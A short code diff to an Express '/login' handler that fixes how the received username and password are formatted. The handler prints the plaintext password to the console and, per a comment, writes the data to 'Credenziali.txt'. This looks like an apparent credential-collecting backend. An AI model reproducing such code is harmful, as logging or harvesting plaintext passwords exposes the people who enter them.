@@ -14,11 +14,11 @@ app.post('/login', (req, res) => {
 
   if (!req.body.password) {
     console.log('Received username:', username);
-    data = !"Username: " + username;
+    data = "Username: " + username;
   };
   if (!req.body.username) {
     console.log('Received password:', password);
-    data = "Password: " + password + "\n";
+    data = " Password: " + password + "\n";
   };
 
   // Write data in 'Credenziali.txt' .
